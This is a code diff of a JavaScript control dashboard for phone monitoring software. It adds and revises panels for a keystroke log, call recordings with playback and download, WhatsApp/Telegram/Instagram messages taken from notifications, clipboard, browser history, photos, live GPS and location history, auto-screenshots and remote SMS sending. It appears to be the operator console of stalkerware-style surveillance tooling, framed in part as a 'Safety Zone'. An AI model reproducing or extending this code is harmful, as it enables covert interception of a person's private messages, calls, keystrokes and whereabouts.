-    // ── Utility ───────────────────────────────────────────────────────────────
-    function parseData(data) {
-        if (typeof data === 'string') {
-            try { return JSON.parse(data); } catch (e) { return data; }
-        }
-        return data;
-    }
-
-    // ── Alerts badge ──────────────────────────────────────────────────────────
-    function pushAlert(title, body) {
-        newAlerts.unshift({ title: title, body: body, time: new Date().toLocaleTimeString() });
-        if (newAlerts.length > 50) newAlerts.pop();
-        const badge = document.getElementById('alertsBadge');
-        const list  = document.getElementById('alertsList');
-        if (!badge || !list) return;
-        badge.style.display = 'block';
-        list.innerHTML = '';
-        newAlerts.forEach(function(a) {
-            const d = document.createElement('div');
-            d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';
-            d.textContent = a.time + ' ' + a.title + ': ' + a.body;
-            list.appendChild(d);
-        });
-    }
-
-    function clearAlerts() {
-        newAlerts.length = 0;
-        const badge = document.getElementById('alertsBadge');
-        if (badge) badge.style.display = 'none';
-    }
-
-    // ── Live GPS ──────────────────────────────────────────────────────────────
-    function toggleLiveGps() {
-        const btn = document.getElementById('liveGpsBtn');
-        if (!liveGpsActive) {
-            sendCommand('START_GPS_UPDATES');
-            liveGpsActive = true;
-            if (btn) {
-                btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
-                btn.style.background = '#d32f2f';
-                btn.style.color = '#fff';
-            }
-            showNotification('Live GPS started');
-        } else {
-            sendCommand('STOP_GPS_UPDATES');
-            liveGpsActive = false;
-            if (btn) {
-                btn.querySelector('span:last-child').textContent = 'Live GPS Track';
-                btn.style.cssText = '';
-            }
-            showNotification('GPS stopped');
-        }
-    }
-
-    // ── Contacts ──────────────────────────────────────────────────────────────
+    // ---------- DATA DISPLAY FUNCTIONS ----------
     function displayContacts(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
@@ -1816,7 +2266,7 @@ window.addEventListener('load', () => {
         wrap.style.overflowX = 'auto';
         const tbl = document.createElement('table');
         tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:13px';
-        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Name</th><th style="padding:8px;text-align:left">Number</th><th style="padding:8px">Calls</th></tr></thead>';
+        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Name</th><th style="padding:8px;text-align:left">Number</th><th style="padding:8px">Times Contacted</th></tr></thead>';
         const tbody = document.createElement('tbody');
         data.forEach(function(c) {
             const tr = document.createElement('tr');
@@ -1832,7 +2282,6 @@ window.addEventListener('load', () => {
         panel.appendChild(wrap);
     }
 
-    // ── Installed Apps ────────────────────────────────────────────────────────
     function displayInstalledApps(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
@@ -1851,7 +2300,7 @@ window.addEventListener('load', () => {
         tbl.innerHTML = '<thead><tr style="background:#f5f7fa;position:sticky;top:0"><th style="padding:8px;text-align:left">App</th><th style="padding:8px;text-align:left">Package</th><th style="padding:8px">Actions</th></tr></thead>';
         const tbody = document.createElement('tbody');
 
-        data.forEach(function(app, idx) {
+        data.forEach(function(app) {
             const tr = document.createElement('tr');
             tr.style.borderBottom = '1px solid #f0f0f0';
 
@@ -1878,7 +2327,6 @@ window.addEventListener('load', () => {
         panel.appendChild(wrap);
     }
 
-    // ── Screen Time ───────────────────────────────────────────────────────────
     function showAppUsagePanel() {
         panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device</p>';
         const btnRow = document.createElement('div');
@@ -1890,55 +2338,50 @@ window.addEventListener('load', () => {
             b.addEventListener('click', function() { sendCommand('GET_APP_USAGE', { days: item[1] }); });
             btnRow.appendChild(b);
         });
-        panel.insertBefore(btnRow, panel.children[1]);
+        panel.appendChild(btnRow);
     }
 
     function displayAppUsage(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999">No data. Enable Usage Access in device Settings → Digital Wellbeing.</p>';
+            panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999">No data available. Enable Usage Access in device Settings.</p>';
             return;
         }
         const h3 = document.createElement('h3');
         h3.textContent = '📊 Screen Time (' + data.length + ' apps)';
         panel.appendChild(h3);
 
-        const wrap = document.createElement('div');
-        wrap.style.overflowX = 'auto';
-        const tbl = document.createElement('table');
-        tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:13px';
-        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">App</th><th style="padding:8px">Usage</th><th style="padding:8px;min-width:100px;text-align:left">Bar</th></tr></thead>';
-        const tbody = document.createElement('tbody');
-        const maxMs = data[0].totalTimeMs || 1;
-        data.forEach(function(a) {
-            const pct = Math.max(2, Math.round(a.totalTimeMs / maxMs * 100));
-            const col = a.totalTimeMs > 3600000 ? '#d32f2f' : a.totalTimeMs > 1800000 ? '#ff9800' : '#4caf50';
-            const tr = document.createElement('tr');
-            tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.padding = '7px 8px'; td1.textContent = a.appName || '';
-            const td2 = document.createElement('td'); td2.style.cssText = 'padding:7px 8px;text-align:center;font-weight:600'; td2.textContent = a.totalTimeFmt || '';
-            const td3 = document.createElement('td'); td3.style.padding = '7px 8px';
-            const bar = document.createElement('div');
-            bar.style.cssText = 'height:10px;border-radius:5px;width:' + pct + '%;background:' + col;
-            td3.appendChild(bar);
-            tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
-            tbody.appendChild(tr);
+        data.forEach(function(app) {
+            const totalMs = app.totalTimeMs || 0;
+            const hours = Math.floor(totalMs / 3600000);
+            const minutes = Math.floor((totalMs % 3600000) / 60000);
+            const timeStr = hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m`;
+            
+            const maxMs = Math.max(...data.map(a => a.totalTimeMs || 0));
+            const pct = maxMs > 0 ? Math.round((totalMs / maxMs) * 100) : 0;
+            
+            const itemDiv = document.createElement('div');
+            itemDiv.className = 'app-usage-item';
+            itemDiv.innerHTML = `
+                <div class="app-usage-name">${app.appName || app.packageName || 'Unknown'}</div>
+                <div class="app-usage-time">${timeStr}</div>
+                <div style="flex:0.5; margin-left:10px;">
+                    <div class="usage-bar" style="width:${pct}%; background-color:${totalMs > 3600000 ? '#d32f2f' : totalMs > 1800000 ? '#ff9800' : '#4caf50'};"></div>
+                </div>
+            `;
+            panel.appendChild(itemDiv);
         });
-        tbl.appendChild(tbody);
-        wrap.appendChild(tbl);
-        panel.appendChild(wrap);
     }
 
-    // ── Social Messages ───────────────────────────────────────────────────────
     function displayNotifications(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>🔔 Social Messages</h3><p style="color:#999;margin-top:16px">No messages yet.<br>Enable Notification Access: Settings → Apps → Special App Access → Notification Access</p>';
+            panel.innerHTML = '<h3>🔔 Notifications</h3><p style="color:#999;margin-top:16px">No notifications yet.</p>';
             return;
         }
         const hdr = document.createElement('div');
         hdr.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:10px';
-        const h3 = document.createElement('h3'); h3.style.margin = '0'; h3.textContent = '🔔 Social Messages (' + data.length + ')';
+        const h3 = document.createElement('h3'); h3.style.margin = '0'; h3.textContent = '🔔 Notifications (' + data.length + ')';
         const clr = document.createElement('button');
         clr.textContent = 'Clear';
         clr.style.cssText = 'padding:5px 12px;background:#d32f2f;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px';
@@ -1951,21 +2394,20 @@ window.addEventListener('load', () => {
             card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:8px;padding:10px;margin-bottom:8px';
             const top = document.createElement('div');
             top.style.cssText = 'display:flex;justify-content:space-between;margin-bottom:4px';
-            const appSpan = document.createElement('span'); appSpan.style.cssText = 'font-weight:700;font-size:13px'; appSpan.textContent = n.app || '';
-            const timeSpan = document.createElement('span'); timeSpan.style.cssText = 'color:#aaa;font-size:11px'; timeSpan.textContent = n.timeFmt || '';
+            const appSpan = document.createElement('span'); appSpan.style.cssText = 'font-weight:700;font-size:13px'; appSpan.textContent = n.app || n.packageName || '';
+            const timeSpan = document.createElement('span'); timeSpan.style.cssText = 'color:#aaa;font-size:11px'; timeSpan.textContent = n.timeFmt || n.date || '';
             top.appendChild(appSpan); top.appendChild(timeSpan);
             const title = document.createElement('div'); title.style.cssText = 'font-size:13px;font-weight:600;color:#555'; title.textContent = n.title || '';
-            const text  = document.createElement('div'); text.style.cssText = 'font-size:13px;color:#333;margin-top:2px'; text.textContent = n.text || '';
+            const text  = document.createElement('div'); text.style.cssText = 'font-size:13px;color:#333;margin-top:2px'; text.textContent = n.text || n.body || '';
             card.appendChild(top); card.appendChild(title); card.appendChild(text);
             panel.appendChild(card);
         });
     }
 
-    // ── Keyboard Log ──────────────────────────────────────────────────────────
     function displayKeylog(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p style="color:#999">No keystrokes yet. Enable Accessibility Service on device.</p>';
+            panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p style="color:#999">No keystrokes yet.</p>';
             return;
         }
         const hdr = document.createElement('div');
@@ -1985,22 +2427,17 @@ window.addEventListener('load', () => {
         const tbody = document.createElement('tbody');
         data.slice().reverse().forEach(function(e) {
             const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = e.timeFmt || '';
-            const td2 = document.createElement('td'); td2.style.cssText = 'padding:5px 8px;font-size:11px'; td2.textContent = (e.pkg || '').split('.').pop();
-            const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;font-family:monospace'; td3.textContent = e.text || '';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = e.timeFmt || e.date || '';
+            const td2 = document.createElement('td'); td2.style.cssText = 'padding:5px 8px;font-size:11px'; td2.textContent = (e.pkg || e.packageName || '').split('.').pop();
+            const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;font-family:monospace'; td3.textContent = e.text || e.key || '';
             tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
             tbody.appendChild(tr);
         });
         tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
     }
 
-    // ── Browser History ───────────────────────────────────────────────────────
     function displayBrowserHistory(data) {
         panel.innerHTML = '';
-        if (!data || data.error) {
-            panel.innerHTML = '<h3>🌐 Browser History</h3><p style="color:#999">' + (data && data.error ? data.error : 'Not available on this device.') + '</p>';
-            return;
-        }
         if (!Array.isArray(data) || data.length === 0) {
             panel.innerHTML = '<h3>🌐 Browser History</h3><p style="color:#999">No history found.</p>';
             return;
@@ -2015,7 +2452,7 @@ window.addEventListener('load', () => {
         const tbody = document.createElement('tbody');
         data.forEach(function(item) {
             const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;white-space:nowrap;color:#999;font-size:11px'; td1.textContent = item.date || '';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;white-space:nowrap;color:#999;font-size:11px'; td1.textContent = item.date || item.timeFmt || '';
             const td2 = document.createElement('td'); td2.style.padding = '5px 8px'; td2.textContent = item.title || '';
             const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap';
             const a = document.createElement('a'); a.href = item.url || '#'; a.target = '_blank'; a.style.cssText = 'color:#1976ff;text-decoration:none'; a.textContent = item.url || '';
@@ -2026,7 +2463,6 @@ window.addEventListener('load', () => {
         tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
     }
 
-    // ── Wi-Fi Networks ────────────────────────────────────────────────────────
     function displayWifiNetworks(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
@@ -2056,20 +2492,42 @@ window.addEventListener('load', () => {
         tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
     }
 
-    // ── Clipboard ─────────────────────────────────────────────────────────────
     function displayClipboard(data) {
-        const clip = (typeof data === 'object' && data !== null) ? data : { content: String(data || ''), type: 'text' };
+        const content = data && data.content ? data.content : (data || '');
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '📋 Clipboard';
         const card = document.createElement('div');
         card.style.cssText = 'background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;margin-top:12px';
-        const typeDiv = document.createElement('div'); typeDiv.style.cssText = 'font-size:11px;color:#999;margin-bottom:6px'; typeDiv.textContent = 'Type: ' + (clip.type || 'unknown');
-        const contentDiv = document.createElement('div'); contentDiv.style.cssText = 'font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6'; contentDiv.textContent = clip.content || '(empty)';
+        const typeDiv = document.createElement('div'); typeDiv.style.cssText = 'font-size:11px;color:#999;margin-bottom:6px'; typeDiv.textContent = 'Type: ' + (data && data.type ? data.type : 'text');
+        const contentDiv = document.createElement('div'); contentDiv.style.cssText = 'font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6'; contentDiv.textContent = content;
         card.appendChild(typeDiv); card.appendChild(contentDiv);
         panel.appendChild(h3); panel.appendChild(card);
     }
 
-    // ── Geofence ──────────────────────────────────────────────────────────────
+    // ---------- LIVE GPS ----------
+    function toggleLiveGps() {
+        const btn = document.getElementById('liveGpsBtn');
+        if (!liveGpsActive) {
+            sendCommand('START_GPS_UPDATES');
+            liveGpsActive = true;
+            if (btn) {
+                btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
+                btn.style.background = '#d32f2f';
+                btn.style.color = '#fff';
+            }
+            showNotification('Live GPS started');
+        } else {
+            sendCommand('STOP_GPS_UPDATES');
+            liveGpsActive = false;
+            if (btn) {
+                btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+                btn.style.cssText = '';
+            }
+            showNotification('GPS stopped');
+        }
+    }
+
+    // ---------- GEOFENCE ----------
     function showGeofencePanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '🗺️ Geofence — Safety Zone';
@@ -2137,7 +2595,7 @@ window.addEventListener('load', () => {
         showNotification('Geofence set at ' + lat.toFixed(4) + ', ' + lon.toFixed(4));
     }
 
-    // ── Auto Screenshot ───────────────────────────────────────────────────────
+    // ---------- AUTO SCREENSHOT ----------
     function showSchedulePanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '⏱️ Auto Screenshot';
@@ -2181,7 +2639,7 @@ window.addEventListener('load', () => {
         showNotification('Auto-capture every ' + mins + ' min');
     }
 
-    // ── Send SMS ──────────────────────────────────────────────────────────────
+    // ---------- SEND SMS ----------
     function showSendSmsPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '✉️ Send SMS';
@@ -2196,7 +2654,7 @@ window.addEventListener('load', () => {
             wrap.appendChild(lbl); wrap.appendChild(inp); return wrap;
         }
         form.appendChild(makeField('Phone Number', 'smsNumber', 'input', { type: 'tel', placeholder: '+91 99999 00000' }));
-        form.appendChild(makeField('Message',      'smsBody',   'textarea', { rows: 4, placeholder: 'Type message…', style: 'width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;resize:vertical;box-sizing:border-box' }));
+        form.appendChild(makeField('Message',      'smsBody',   'textarea', { rows: 4, placeholder: 'Type message…' }));
 
         const sendBtn = document.createElement('button');
         sendBtn.textContent = '📤 Send';
@@ -2213,6 +2671,550 @@ window.addEventListener('load', () => {
         sendCommand('SEND_SMS', { number: number, body: body });
     }
 
+    // ---------- FEATURE 1: SOCIAL MESSAGES ----------
+    let socialMsgsData = [];
+
+    function showSocialMessagesPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '💬 Social Messages';
+        panel.appendChild(h3);
+        const filterRow = document.createElement('div');
+        filterRow.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px';
+        [['All','ALL'],['WhatsApp','com.whatsapp'],['Telegram','org.telegram.messenger'],
+         ['Instagram','com.instagram.android']].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:4px 12px;background:#e3f2fd;color:#1976ff;border:1px solid #bbdefb;border-radius:12px;cursor:pointer;font-size:12px';
+            b.addEventListener('click', function() { filterSocialByPkg(item[1]); });
+            filterRow.appendChild(b);
+        });
+        const dayRow = document.createElement('div');
+        dayRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:6px 14px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
+            b.addEventListener('click', function() {
+                sendCommand('GET_SOCIAL_MESSAGES', {days: item[1]});
+            });
+            dayRow.appendChild(b);
+        });
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#999;font-size:12px;margin-bottom:8px';
+        note.textContent = 'Captures WhatsApp, Telegram, Instagram and other notifications.';
+        const list = document.createElement('div'); list.id = 'socialMsgList';
+        panel.appendChild(filterRow); panel.appendChild(dayRow);
+        panel.appendChild(note); panel.appendChild(list);
+        sendCommand('GET_SOCIAL_MESSAGES', {days:1});
+    }
+
+    function displaySocialMessages(data) {
+    const container = document.getElementById('socialMsgList') || panel;
+    container.innerHTML = '';
+    
+    // Parse data if it's a string
+    let messages = data;
+    if (typeof data === 'string') {
+        try {
+            messages = JSON.parse(data);
+        } catch (e) {
+            console.error('Failed to parse social messages:', e);
+            container.innerHTML = '<p style="color:#999">Error parsing messages</p>';
+            return;
+        }
+    }
+    
+    if (!Array.isArray(messages) || messages.length === 0) {
+        container.innerHTML = '<p style="color:#999;padding:16px 0">No messages yet. Make sure Notification Access is enabled.</p>';
+        return;
+    }
+    
+    socialMsgsData = messages;
+    renderSocialMessages(messages);
+}
+
+function renderSocialMessages(data) {
+    const container = document.getElementById('socialMsgList') || panel;
+    container.innerHTML = '';
+    
+    data.slice().reverse().forEach(function(n) {
+        const card = document.createElement('div');
+        card.dataset.pkg = n.pkg || '';
+        card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
+        
+        const top = document.createElement('div');
+        top.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:4px';
+        
+        const appSpan = document.createElement('span');
+        appSpan.style.cssText = 'font-weight:700;font-size:13px;color:#1976ff';
+        appSpan.textContent = n.app || getAppNameFromPkg(n.pkg) || 'Unknown';
+        
+        const timeSpan = document.createElement('span');
+        timeSpan.style.cssText = 'color:#aaa;font-size:11px';
+        timeSpan.textContent = n.timeFmt || n.time || '';
+        
+        top.appendChild(appSpan);
+        top.appendChild(timeSpan);
+        
+        const sender = document.createElement('div');
+        sender.style.cssText = 'font-size:13px;font-weight:600;color:#333;margin-bottom:2px';
+        sender.textContent = n.title || '';
+        
+        const text = document.createElement('div');
+        text.style.cssText = 'font-size:13px;color:#555;line-height:1.4';
+        text.textContent = n.text || n.body || '';
+        
+        card.appendChild(top);
+        card.appendChild(sender);
+        card.appendChild(text);
+        container.appendChild(card);
+    });
+}
+
+function getAppNameFromPkg(pkg) {
+    const map = {
+        'com.whatsapp': 'WhatsApp',
+        'org.telegram.messenger': 'Telegram',
+        'com.instagram.android': 'Instagram',
+        'com.facebook.orca': 'Messenger',
+        'com.facebook.katana': 'Facebook',
+        'com.snapchat.android': 'Snapchat',
+        'com.twitter.android': 'Twitter',
+        'com.viber.voip': 'Viber',
+        'com.skype.raider': 'Skype'
+    };
+    return map[pkg] || pkg;
+}
+
+    function filterSocialByPkg(pkg) {
+        if (!socialMsgsData.length) return;
+        const filtered = pkg === 'ALL' ? socialMsgsData
+            : socialMsgsData.filter(function(n) { return (n.pkg === pkg || n.packageName === pkg); });
+        renderSocialMessages(filtered);
+    }
+
+    function pushLiveNotification(json) {
+        pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || ''));
+    }
+
+    // ---------- FEATURE 2: CALL RECORDINGS ----------
+    function showCallRecordingsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🎙️ Call Recordings';
+        panel.appendChild(h3);
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#ff9800;font-size:12px;margin-bottom:12px;background:#fff3e0;border-radius:6px;padding:8px';
+        note.textContent = '⚠️ On some devices, only microphone audio may be captured.';
+        panel.appendChild(note);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                sendCommand('GET_CALL_RECORDINGS', {days: item[1]});
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const listDiv = document.createElement('div'); listDiv.id = 'callRecList';
+        listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
+        panel.appendChild(listDiv);
+        sendCommand('GET_CALL_RECORDINGS', {days:5});
+    }
+
+    function displayCallRecordings(data) {
+        const container = document.getElementById('callRecList') || panel;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            container.innerHTML = '<p style="color:#999">No recordings yet.</p>';
+            return;
+        }
+        data.forEach(function(rec) {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff;border:1px solid #e0e0e0;border-radius:10px;padding:12px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px';
+            const left = document.createElement('div');
+            const dirIcon = rec.direction === 'INCOMING' ? '📞' : '📤';
+            const nameDiv = document.createElement('div');
+            nameDiv.style.cssText = 'font-weight:700;font-size:14px';
+            nameDiv.textContent = dirIcon + ' ' + (rec.name || rec.number || 'Unknown');
+            const detailDiv = document.createElement('div');
+            detailDiv.style.cssText = 'font-size:12px;color:#999;margin-top:2px';
+            detailDiv.textContent = (rec.number || '') + '  •  ' + (rec.duration || '') + '  •  ' + (rec.timeFmt || rec.date || '');
+            left.appendChild(nameDiv); left.appendChild(detailDiv);
+            const playBtn = document.createElement('button');
+            playBtn.textContent = '▶ Play';
+            playBtn.style.cssText = 'padding:6px 14px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:13px';
+            playBtn.addEventListener('click', function() {
+                playBtn.textContent = '⏳';
+                sendCommand('GET_CALL_AUDIO', {id: rec.id, filePath: rec.filePath});
+            });
+            card.appendChild(left); card.appendChild(playBtn);
+            container.appendChild(card);
+        });
+    }
+
+    function handleCallAlert(json) {
+        if (json.event === 'RINGING') {
+            pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')');
+            showNotification('📞 Incoming: ' + (json.name || json.number));
+        } else if (json.event === 'MISSED') {
+            pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')');
+            showNotification('📵 Missed: ' + (json.name || json.number));
+        } else {
+            pushAlert('🎙️ Call Recorded', (json.direction || '') + ' • ' + (json.number || '') + ' • ' + (json.duration || ''));
+        }
+    }
+
+    function playCallRecording(audioData) {
+        const modal = document.createElement('div');
+        modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999';
+        const box = document.createElement('div');
+        box.style.cssText = 'background:#fff;border-radius:16px;padding:24px;min-width:300px;max-width:90vw';
+        const title = document.createElement('h3'); title.style.margin='0 0 16px';
+        title.textContent = '🎙️ ' + (audioData.name || 'Call Recording');
+        const audioEl = document.createElement('audio');
+        audioEl.controls = true; audioEl.style.width = '100%';
+        audioEl.src = 'data:audio/mp4;base64,' + audioData.audio;
+        const dlBtn = document.createElement('button');
+        dlBtn.textContent = '💾 Download';
+        dlBtn.style.cssText = 'margin-top:12px;padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-right:8px';
+        dlBtn.addEventListener('click', function() { downloadBase64(audioData.audio, audioData.name || 'recording.m4a'); });
+        const closeBtn = document.createElement('button');
+        closeBtn.textContent = '✕ Close';
+        closeBtn.style.cssText = 'margin-top:12px;padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer';
+        closeBtn.addEventListener('click', function() { document.body.removeChild(modal); });
+        box.appendChild(title); box.appendChild(audioEl);
+        box.appendChild(dlBtn); box.appendChild(closeBtn);
+        modal.appendChild(box); document.body.appendChild(modal);
+        audioEl.play().catch(function() {});
+    }
+
+    // ---------- FEATURE 3: PHOTO GALLERY ----------
+    function showPhotoGalleryPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🖼️ Photo Gallery';
+        panel.appendChild(h3);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                sendCommand('GET_RECENT_IMAGES', {days: item[1]});
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const grid = document.createElement('div'); grid.id = 'photoGrid';
+        grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px';
+        grid.innerHTML = '<p style="color:#999;padding:20px">Loading...</p>';
+        panel.appendChild(grid);
+        sendCommand('GET_RECENT_IMAGES', {days:5});
+    }
+
+    function displayPhotoGallery(data) {
+        const grid = document.getElementById('photoGrid');
+        if (!grid) return;
+        grid.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            grid.innerHTML = '<p style="color:#999">No images found.</p>'; return;
+        }
+        data.forEach(function(img) {
+            const tile = document.createElement('div');
+            tile.style.cssText = 'position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#f0f0f0;aspect-ratio:1';
+            if (img.thumb) {
+                const image = document.createElement('img');
+                image.src = 'data:image/jpeg;base64,' + img.thumb;
+                image.style.cssText = 'width:100%;height:100%;object-fit:cover;display:block';
+                tile.appendChild(image);
+            } else {
+                tile.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px">🖼️</div>';
+            }
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px 4px';
+            overlay.textContent = img.dateFmt || img.date || '';
+            tile.appendChild(overlay);
+            tile.addEventListener('click', function() {
+                sendCommand('GET_IMAGE', {mediaId: img.id || img.mediaId});
+                showNotification('Loading image...');
+            });
+            grid.appendChild(tile);
+        });
+    }
+
+    function showFullImage(b64, mediaId) {
+        const modal = document.createElement('div');
+        modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.92);display:flex;align-items:center;justify-content:center;z-index:99999;cursor:pointer';
+        const img = document.createElement('img');
+        img.src = 'data:image/jpeg;base64,' + b64;
+        img.style.cssText = 'max-width:95vw;max-height:90vh;object-fit:contain;border-radius:8px';
+        const dlBtn = document.createElement('button');
+        dlBtn.textContent = '💾 Save';
+        dlBtn.style.cssText = 'position:absolute;bottom:20px;left:50%;transform:translateX(-50%);padding:10px 24px;background:#1976ff;color:#fff;border:none;border-radius:10px;cursor:pointer;font-size:14px';
+        dlBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            downloadBase64(b64, 'photo_' + (mediaId || Date.now()) + '.jpg');
+        });
+        modal.appendChild(img); modal.appendChild(dlBtn);
+        modal.addEventListener('click', function() { document.body.removeChild(modal); });
+        document.body.appendChild(modal);
+    }
+
+    // ---------- FEATURE 7: LOCATION HISTORY ----------
+    function showLocationHistoryPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '📍 Location History';
+        panel.appendChild(h3);
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#666;font-size:12px;margin-bottom:10px';
+        note.textContent = 'GPS fixes logged automatically.';
+        panel.appendChild(note);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                sendCommand('GET_LOCATION_HISTORY', {days: item[1]});
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const mapDiv = document.createElement('div'); mapDiv.id = 'historyMap';
+        mapDiv.style.cssText = 'width:100%;height:320px;border-radius:10px;margin-bottom:12px';
+        panel.appendChild(mapDiv);
+        const listDiv = document.createElement('div'); listDiv.id = 'historyList';
+        panel.appendChild(listDiv);
+        sendCommand('GET_LOCATION_HISTORY', {days:3});
+        setTimeout(function() {
+            try {
+                window._historyMap = L.map('historyMap').setView([20.5937, 78.9629], 5);
